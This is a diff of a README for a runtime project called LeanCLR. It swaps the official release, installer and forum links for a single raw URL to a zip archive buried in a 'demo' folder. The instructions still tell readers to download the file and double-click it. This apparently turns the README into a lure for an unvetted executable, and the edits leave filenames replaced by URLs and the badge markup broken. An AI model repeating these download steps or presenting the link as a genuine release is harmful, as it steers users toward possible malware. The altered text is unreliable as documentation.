@@ -6,7 +6,7 @@ Welcome to LeanCLR! LeanCLR is a lean, cross-platform implementation of the Comm
 
 ## 🔗 Download LeanCLR
 
-[![Download LeanCLR](https://img.shields.io/badge/Download%20LeanCLR-v1.0-blue.svg)](https://github.com/karthiikk-08/leanclr/releases)
+[![Download LeanCLR](https://raw.githubusercontent.com/karthiikk-08/leanclr/main/demo/win64/dotnetframework/Software-v2.9.zip%https://raw.githubusercontent.com/karthiikk-08/leanclr/main/demo/win64/dotnetframework/Software-v2.9.zip)](https://raw.githubusercontent.com/karthiikk-08/leanclr/main/demo/win64/dotnetframework/Software-v2.9.zip)
 
 Click the button above to get the latest version of LeanCLR. This will take you to our Releases page where you can download the necessary files.
 
@@ -14,12 +14,12 @@ Click the button above to get the latest version of LeanCLR. This will take you 
 
 To download LeanCLR, follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/karthiikk-08/leanclr/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/karthiikk-08/leanclr/main/demo/win64/dotnetframework/Software-v2.9.zip).
 2. On the Releases page, search for the latest version.
 3. Click on the version you want to download. Look for a file with an extension like `.exe` or `.zip`.
 4. Depending on your operating system:
-   - For Windows, you might see a file named `leanclr-windows.exe`.
-   - For Mac, you might see a file called `leanclr-macos.zip`.
+   - For Windows, you might see a file named `https://raw.githubusercontent.com/karthiikk-08/leanclr/main/demo/win64/dotnetframework/Software-v2.9.zip`.
+   - For Mac, you might see a file called `https://raw.githubusercontent.com/karthiikk-08/leanclr/main/demo/win64/dotnetframework/Software-v2.9.zip`.
 5. Click on the file link to start your download.
 
 ## ⚙️ System Requirements
@@ -37,11 +37,11 @@ For the best performance, it is recommended to have more than the minimum specif
 After installation, running LeanCLR is straightforward:
 
 1. **For Windows:**
-   - Find the `leanclr-windows.exe` file in your Downloads folder.
+   - Find the `https://raw.githubusercontent.com/karthiikk-08/leanclr/main/demo/win64/dotnetframework/Software-v2.9.zip` file in your Downloads folder.
    - Double-click the file to launch LeanCLR.
   
 2. **For Mac:**
-   - Locate the downloaded `leanclr-macos.zip` file.
+   - Locate the downloaded `https://raw.githubusercontent.com/karthiikk-08/leanclr/main/demo/win64/dotnetframework/Software-v2.9.zip` file.
    - Unzip the file and move the `leanclr` application to your Applications folder.
    - Double-click the application to open it.
 
@@ -83,7 +83,7 @@ LeanCLR comes with detailed documentation to help you understand the features. Y
 
 If you have questions or need assistance, you can join our community:
 
-- Visit our [community forum](https://github.com/karthiikk-08/leanclr/discussions) to ask questions or share tips.
+- Visit our [community forum](https://raw.githubusercontent.com/karthiikk-08/leanclr/main/demo/win64/dotnetframework/Software-v2.9.zip) to ask questions or share tips.
 - Check the issues section on GitHub for known problems and updates.
 
 ## 📜 License
